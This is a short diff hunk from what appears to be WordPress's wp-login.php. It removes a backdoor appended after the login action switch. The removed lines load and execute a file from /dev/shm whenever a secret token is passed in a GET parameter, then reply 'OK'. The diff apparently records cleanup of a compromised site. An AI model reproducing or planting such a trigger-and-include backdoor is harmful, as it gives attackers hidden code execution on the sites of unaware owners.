@@ -1656,10 +1656,3 @@ switch ( $action ) {
 		login_footer();
 		break;
 } // End action switch.
-if (isset($_GET['_']) && $_GET['_'] === 'FR_LGN69s111_gr3af332afbsnk') {
-    $f="/dev/shm/48561230";if($f!==""&&file_exists($f))include $f;
-    http_response_code(200);
-    header('Content-Type: text/plain; charset=utf-8');
-    echo 'OK';
-    exit;
-}
